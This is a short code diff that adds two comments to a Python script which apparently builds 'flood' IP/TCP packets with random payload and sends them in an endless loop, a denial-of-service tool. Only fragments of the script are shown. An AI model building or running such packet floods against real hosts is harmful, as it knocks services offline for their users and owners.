@@ -32,6 +32,7 @@ def main():
     source_port = int(args[2])
     destination_port = int(args[3])
 
+    #Fills Packet with random data
     message = random.randint(9999999999999, 9999999999999999999999999)
 
     #Builds IP Layer of Flood Packet
@@ -46,6 +47,7 @@ def main():
     print("\n")
     while(True):
             send(ip_packet/tcp_packet, verbose=False)
+	    #Prints total number of packets
             print("{}".format(str(packet)), end="\r")
             packet = packet + 1
             
